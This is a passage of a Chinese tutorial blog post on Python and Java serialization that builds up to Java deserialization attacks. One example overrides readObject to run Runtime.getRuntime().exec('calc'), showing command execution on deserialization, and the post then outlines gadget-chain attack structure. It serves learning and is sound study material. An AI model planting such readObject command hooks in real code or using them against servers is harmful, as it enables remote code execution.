class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-comment"># 定义一个类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br><br><span class="hljs-comment"># 创建一个Person对象</span><br>person = Person(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">25</span>)<br><br><span class="hljs-comment"># 序列化对象</span><br>serialized_data = pickle.dumps(person)<br><br><span class="hljs-comment"># 打印序列化后的字节流</span><br><span class="hljs-built_in">print</span>(serialized_data)<br><br><span class="hljs-comment"># 反序列化对象</span><br>deserialized_person = pickle.loads(serialized_data)<br><br><span class="hljs-comment"># 打印反序列化后的对象属性</span><br><br><span class="hljs-built_in">print</span>(deserialized_person.name)<br><span class="hljs-built_in">print</span>(deserialized_person.age)<br><br>/*<span class="hljs-string">b&#x27;\x80\x04\x95\x1b\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Person\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x04name\x94\x8c\x05Alice\x94\x8c\x03age\x94K\x19ub.&#x27;</span><br>Alice<br><span class="hljs-number">25</span><br><br><span class="hljs-comment">#当然也可以使用Json.dumps()函数将对象序列化成Json格式：</span><br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># 定义一个字典</span><br>data = &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Alice&quot;</span>,<br>    <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">25</span>,<br>    <span class="hljs-string">&quot;city&quot;</span>: <span class="hljs-string">&quot;New York&quot;</span><br>&#125;<br><br><span class="hljs-comment"># 序列化数据为字符串</span><br>serialized_data = json.dumps(data)<br><br><span class="hljs-comment"># 打印序列化后的字符串</span><br><span class="hljs-built_in">print</span>(serialized_data)<br><br><span class="hljs-comment">#</span><br>&#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">25</span>, <span class="hljs-string">&quot;city&quot;</span>: <span class="hljs-string">&quot;New York&quot;</span>&#125;<br></code></pre></td></tr></table></figure><ul><li>java</li></ul><p>​<code>Java</code>反序列化的操作，很多是需要开发者深入参与的，大量的库都会实现<code>readObject、writeObject</code>方法，这和PHP中的<code>__wakeup、__sleep</code>很少使用是存在鲜明对比的。</p><p>​<code>Java</code>在序列化一个对象时，将会调用这个对象中的<code>writeObject</code>方法，参数类型是<code>ObjectOutputStream</code>，开发者可以将任何内容写入这个流当中，反序列化时会调用<code>readObject</code>，开发者也可以从中读取前面写入的内容，并进行处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//参考了mochu7师傅的文章</span><br><span class="hljs-keyword">package</span> StudyUnserialiation;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<span class="hljs-comment">//Serializable是一个标记接口，用于标识一个类可以被序列化</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<span class="hljs-comment">//implements是一个关键字，用于表示一个类实现了一个接口。</span><br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream s)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        s.defaultWriteObject();<br>        s.writeObject(<span class="hljs-string">&quot;This is Object&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        s.defaultReadObject(); <br>        s.readObject();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> (String) s.readObject();<br>        System.out.println(message);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><span class="hljs-comment">//重写</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//writeObject和readObject方法可以完全自定义。当一个类实现了Serializable接口时，它可以选择重写这两个方法来自定义对象的序列化和反序列化过程。</span><br><span class="hljs-comment">//writeObject方法用于将对象序列化为字节流。当对象被序列化时，writeObject方法会被自动调用。在这个方法中，可以自定义需要序列化的字段和逻辑。例如，可以在序列化过程中对某些字段进行加密或压缩操作。</span><br><span class="hljs-comment">//readObject方法用于将字节流反序列化为对象。当对象被反序列化时，readObject方法会被自动调用。在这个方法中，可以自定义需要反序列化的字段和逻辑。例如，可以在反序列化过程中对某些字段进行解密或解压操作。</span><br></code></pre></td></tr></table></figure><h3 id="0x03-java反序列化基础"><a href="#0x03-java反序列化基础" class="headerlink" title="0x03 java反序列化基础"></a>0x03 java反序列化基础</h3><p>在Java中，如果一个类需要被序列化和反序列化，需要实现<code>java.io.Serializable</code>接口，比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> String name;<br>&#125;<br></code></pre></td></tr></table></figure><p>Java原生实现了一套序列化的机制，我们不需要额外编写代码，只需要实现<code>java.io.Serializable</code>接口，并调用<code>ObjectOutputStream</code>类的的<code>writeObject</code>方法即可，比如要对下面这个<code>Person</code>类进行序列化操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Persona</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Persona</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;无参构造.&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Persona</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        System.out.println(<span class="hljs-string">&quot;有参构造.&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//参考https://dyfloveslife.github.io/2020/03/21/Serialization-and-Deserialization-in-Java/</span><br></code></pre></td></tr></table></figure><p>将其序列化，将对象的信息写入到<code>abc.txt</code>文件中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializableTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">Persona</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Persona</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>, <span class="hljs-number">24</span>);<br>        <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;abc.txt&quot;</span>));<br>        oos.writeObject(person);<br>        oos.close();<br>    &#125;<br>&#125;<br><span class="hljs-comment">//ObjectOutputStream 是一个用于将对象序列化为字节流的类。</span><br><span class="hljs-comment">//writeObject 方法将 person 对象写入到 ObjectOutputStream中</span><br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">有参构造.<br></code></pre></td></tr></table></figure><p>可以打开<code>abc.txt</code>看看怎么个事：</p><p><img src="/img/javafan1.png" alt="javafan1"></p><p>反序列化对象时，需要创建一个 <code>ObjectInputStream</code> 输入流，然后调用<code>ObjectInputStream</code>对象的 <code>readObject() </code>方法得到序列化的对象即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnSerializableTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;abc.txt&quot;</span>));<br>        <span class="hljs-type">Persona</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Persona) ois.readObject();<span class="hljs-comment">//注意这里的强制类型转换</span><br>        System.out.println(p);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Person&#123;<span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;zhangsan&#x27;</span>, <span class="hljs-attribute">age</span>=24&#125;<br></code></pre></td></tr></table></figure><h3 id="0x04-java反序列化实例"><a href="#0x04-java反序列化实例" class="headerlink" title="0x04 java反序列化实例"></a>0x04 java反序列化实例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//参考https://xilitter.github.io/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</span><br><span class="hljs-comment">//Persion改成Person</span><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">Persion</span> <span class="hljs-variable">persion</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Persion</span>(<span class="hljs-string">&quot;notbad3&quot;</span>,<span class="hljs-number">23</span>);<span class="hljs-comment">//实例化一个对象</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span>  <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-comment">//它是一个字节数组输出流，用于将序列化后的对象输出到字节数组中。</span><br>        <span class="hljs-type">ObjectOutputStream</span>  <span class="hljs-variable">ObjectOutputStream</span>  <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        <span class="hljs-comment">//将persion对象序列化输出到byteArrayOutputStream对象中</span><br>        ObjectOutputStream.writeObject(persion);<br>       <br>        System.out.println(byteArrayOutputStream);<span class="hljs-comment">//打印</span><br>        System.out.println(<span class="hljs-string">&quot;------------------------&quot;</span>);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;data.bin&quot;</span>);<br>        <span class="hljs-comment">//将二进制数据输出到文件中</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fileOutputStream);<br>        <span class="hljs-comment">//序列化</span><br>        oos.writeObject(persion);<br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;data.bin&quot;</span>);<br>        <span class="hljs-comment">//创建对象从二进制文件中读取</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileInputStream);<br>        <span class="hljs-comment">//反序列化</span><br>        <span class="hljs-type">Persion</span> <span class="hljs-variable">newpersion</span> <span class="hljs-operator">=</span>(Persion) objectInputStream.readObject();<br>        <span class="hljs-comment">//从 fileInputStream 中读取序列化后的对象，并将其转换成 Persion 对象类型。</span><br>        System.out.println(newpersion);<span class="hljs-comment">//反序列化输出调用tostring函数，因为这里我们把一个对象输出了</span><br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Persion</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>&#123;<br><span class="hljs-comment">//    private transient String name;</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Persion</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Persion&#123;&quot;</span>+<span class="hljs-string">&quot;&#x27;name&#x27;=&quot;</span>+<span class="hljs-built_in">this</span>.name+<span class="hljs-string">&quot;,&#x27;age&#x27;=&quot;</span>+<span class="hljs-built_in">this</span>.age+<span class="hljs-string">&quot;&#125;&quot;</span>;<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>在反序列化过程中会调用<code>toString</code>函数，将字符串输出出来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Persion&#123;&quot;</span>+<span class="hljs-string">&quot;&#x27;name&#x27;=&quot;</span>+<span class="hljs-built_in">this</span>.name+<span class="hljs-string">&quot;,&#x27;age&#x27;=&quot;</span>+<span class="hljs-built_in">this</span>.age+<span class="hljs-string">&quot;&#125;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这东西其实就是<code>toString</code>的重写</p><p><img src="/img/javaafan2.png" alt="javaafan2"></p><p>​如果不重写使用默认的<code>toString</code>方法，<code>toString()</code> 方法会返回一个字符串，其中包含类的名称，后跟一个 ‘@’ 符号和对象的哈希码:</p><p><img src="/img/javafan5.png" alt="javafan5"></p><p>​我们可以使用<code>transient</code>关键字，将一些重要的信息（如密码）不被进行序列化，如果某个属性被<code>transient</code>关键字修饰的话，则该属性不会参与到序列化的过程，此时将其进行反序列化后，如果该属性是引用数据类型，则返回的是 null，如果该属性是基本数据类型（如 int 类型），则会返回默认值 0（当然，boolean 的默认值是 false）。在上面那段代码的基础上做如下修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//private String name; - &gt; private transient String name;</span><br></code></pre></td></tr></table></figure><p><img src="/img/javaafan3.png" alt="javaafan3"></p><h3 id="0x05-重写"><a href="#0x05-重写" class="headerlink" title="0x05 重写"></a>0x05 重写</h3><p>​上面的栗子中对<code>toString</code>方法进行了重写，在实现 <code>Serializable</code> 接口的同时，还可以重写 <code>writeObject() </code>和<code>readObject()</code>方法，这样一旦对象被序列化或被反序列化，就会自动的调用这两个方法，而不会使用默认的序列化机制。</p><p>​造成反序列化最重要的一点就是如果被反序列化的类重写了<code>writeObject</code>和<code>readObject</code>方法，<code>java</code>就会调用重写的方法。如果该重写方法中添加了恶意的，能执行命令的代码，就会达到反序列化攻击的目的。比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//参考https://xilitter.github.io/</span><br><span class="hljs-keyword">import</span> java.lang.Runtime;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;dog&quot;</span>,<span class="hljs-number">6</span>);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;User.bin&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fileOutputStream);<br>        objectOutputStream.writeObject(user);<br>        System.out.println(<span class="hljs-string">&quot;序列化成功&quot;</span>);<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;User.bin&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileInputStream);<br>        <span class="hljs-type">User</span> <span class="hljs-variable">newuser</span> <span class="hljs-operator">=</span>(User) objectInputStream.readObject();<br>        System.out.println(<span class="hljs-string">&quot;反序列化成功&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span>+<span class="hljs-string">&quot;&#x27;name&#x27;=&quot;</span>+<span class="hljs-built_in">this</span>.name+<span class="hljs-string">&quot;,&#x27;age&#x27;=&quot;</span>+<span class="hljs-built_in">this</span>.age+<span class="hljs-string">&quot;&#125;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream oos)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        oos.defaultReadObject();<br>        <span class="hljs-comment">//该方法会将对象默认的反序列化操作执行完毕。</span><br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        <span class="hljs-comment">//重写readObject方法弹出计算机</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上述代码重写了readObject方法，并且添加了弹出计算器的命令，看看效果：</p><p><img src="/img/javafan4.png" alt="javafan4"></p><p>​成功弹出计算器。这样攻击看起来很方便，直接在服务端上传一个重写了readObject方法的类的序列化串，直接能够命令执行。但是这种方式几乎不会出现。为什么？作为后端开发人员，不可能会在代码中留下这么危险的readObject方法，即使有，无源码的情况下，我们也不会知道所属该方法的类名。（因为服务端反序列化的也只有自己的类）普遍的反序列化攻击方式包含三个部分：</p><blockquote><p>入口类：重写了readObject方法，并且是能够被反序列化的，最好是jdk自带的。例如HashMap</p><p>调用链：一个类的方法包含另一个类调用同名同类型的方法</p><p>执行类：能够命令执行或者远程写文件的类</p></blockquote><h2 id="URLDNS链分析-写完放上去"><a href="#URLDNS链分析-写完放上去" class="headerlink" title="URLDNS链分析(写完放上去)"></a>URLDNS链分析(写完放上去)</h2><p>参考文章：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://blog.csdn.net/mocas_wang/article/details/<span class="hljs-number">107621010</span>?ops_request_misc=%<span class="hljs-number">257</span>B%<span class="hljs-number">2522</span>request%<span class="hljs-number">255</span>Fid%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522170149064516800213084111</span>%<span class="hljs-number">2522</span>%<span class="hljs-number">252</span>C%<span 